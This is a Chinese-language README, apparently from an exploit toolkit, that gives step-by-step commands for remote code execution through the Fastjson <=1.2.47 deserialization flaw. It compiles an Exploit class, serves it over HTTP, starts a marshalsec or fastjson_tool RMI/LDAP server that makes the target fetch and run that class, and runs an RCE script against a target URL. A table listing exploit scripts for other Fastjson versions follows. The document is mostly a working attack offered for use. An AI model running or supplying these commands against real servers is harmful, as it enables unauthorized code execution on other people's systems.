## 以 Fastjson 1.2.47 利用为例
### marshalsec-0.0.3-SNAPSHOT-all.jar 启用 RMI/LDAP
```
https://github.com/RandomRobbieBF/marshalsec-jar
```
编译Exploit.java生成Exploit.class
```
javac Exploit.java
```
python3 启一个 http 部署 Exploit.class
```
python3 -m http.server --bind 0.0.0.0 8888
```
marshalsec 开启 rmi
```
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer "http://x.x.x.x:8888/#Exploit" 9999
```

### fastjson_tool.jar 启用 RMI/LDAP
[@wyzxxz](https://github.com/wyzxxz/fastjson_rce_tool)大佬的tools整合了rmi/ldap+命令执行,
```
java -cp fastjson_tool.jar fastjson.HRMIServer 127.0.0.1 9999 "touch /tmp/233"
```

### fastjson-1.2.47_rce.py
> ```
> +------------------------------------------------------------------------------------+
> +      RMIServer: rmi://ip:port/exp                                                                           +
> +      LDAPServer: ldap://ip:port/exp                                                                       +
> +------------------------------------------------------------------------------------+
> + USE: python3 <filename> <target-ip> <RMI/LDAPServer>                               +
> + EXP: python3 fastjson-1.2.47_rce.py http://1.1.1.1:8080/ ldap://2.2.2.2:88/Object  +
> + VER: fastjson<=1.2.47                                                              +
> +------------------------------------------------------------------------------------+
> ```

执行py脚本
- http://1.1.1.1:8080/ 为fastjson漏洞主机
- rmi://2.2.2.2:9999/Exploit 为rmi服务
```
python3 fastjson-1.2.47_rce.py http://1.1.1.1:8080/ rmi://2.2.2.2:9999/Exploit
```
<table>
<tr>
    <th>脚本名称</th>
    <th>脚本介绍</th>
    <th>脚本来源</th>
</tr>
<tr>
    <td>fastjson-1.2.24_rce.py</td>
    <td>fastjson 1.2.24 反序列化 RCE 漏洞</td>
    <td>https://github.com/zhzyker/exphub</td>
</tr>
<tr>
    <td>fastjson-1.2.41_rce.py</td>
    <td>Fastjson <=1.2.47反序列化RCE漏洞(CNVD‐2019‐22238)</td>
    <td>https://github.com/zhzyker/exphub</td>
</tr>
<tr>
    <td>fastjson-1.2.42_rce.py</td>
    <td>Fastjson <=1.2.47反序列化RCE漏洞(CNVD‐2019‐22238)</td>
    <td>https://github.com/zhzyker/exphub</td>
</tr>
<tr>
    <td>fastjson-1.2.43_rce.py</td>
    <td>Fastjson <=1.2.47反序列化RCE漏洞(CNVD‐2019‐22238)</td>
    <td>https://github.com/zhzyker/exphub</td>
</tr>
<tr>
    <td>fastjson-1.2.45_rce.py</td>
    <td>Fastjson <=1.2.47反序列化RCE漏洞(CNVD‐2019‐22238)</td>
    <td>https://github.com/zhzyker/exphub</td>
</tr>
<tr>
   <td>fastjson-1.2.47_rce.py</td>
    <td>Fastjson <=1.2.47反序列化RCE漏洞(CNVD‐2019‐22238)</td>
    <td>https://github.com/zhzyker/exphub</td>
</tr>
<tr>
    <td>fastjson-1.2.62_rce.py</td>
    <td>fastjson <=1.2.66 反序列化 RCE 漏洞</td>
    <td>https://github.com/zhzyker/exphub</td>
</tr>
<tr>
    <td>fastjson-1.2.66_rce.py</td>
    <td>fastjson <=1.2.66 反序列化 RCE 漏洞</td>
    <td>https://github.com/zhzyker/exphub</td>
</tr>
</table>

  
  
